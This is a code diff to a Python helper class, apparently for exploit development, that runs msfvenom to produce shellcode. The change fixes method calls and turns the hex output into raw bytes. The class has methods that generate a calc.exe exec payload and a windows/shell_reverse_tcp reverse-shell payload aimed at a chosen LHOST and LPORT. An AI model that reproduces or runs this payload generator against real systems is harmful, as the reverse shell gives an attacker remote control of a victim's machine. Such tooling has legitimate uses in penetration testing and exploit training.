@@ -130,14 +130,15 @@ class msf_shellcode:
         pattern = r'(\\x[0-9a-fA-F]{2})'
         match = re.findall(pattern,result.stdout,re.I|re.M)
         shellcode = ""
-        for m in match:
-            shellcode += m
-        return shellcode
+        for m in match: shellcode += m.replace('\\x','')
+        ba = bytearray.fromhex(shellcode)
+        
+        return ba.decode(encoding='latin-1')
     def generate_popcalc(self,exitfunc="thread",badchars=""):
-        shellcode = run_msfvenom_command(f"-p windows/exec CMD=calc.exe EXITFUNC={exitfunc} -b '{badchars}' -f python")
+        shellcode = self.run_msfvenom_command(f"-p windows/exec CMD=calc.exe EXITFUNC={exitfunc} -b '{badchars}' -f python")
         return shellcode
     def generate_ncrev_shell(self,exitfunc="thread",badchars="",lhost="",lport=""):
-        return run_msfvenom_command(f"-p windows/shell_reverse_tcp EXITFUNC={exitfunc} -b '{badchars}' -f python LHOST={lhost} LPORT={lport}")
+        return self.run_msfvenom_command(f"-p windows/shell_reverse_tcp EXITFUNC={exitfunc} -b '{badchars}' -f python LHOST={lhost} LPORT={lport}")
               
               
               
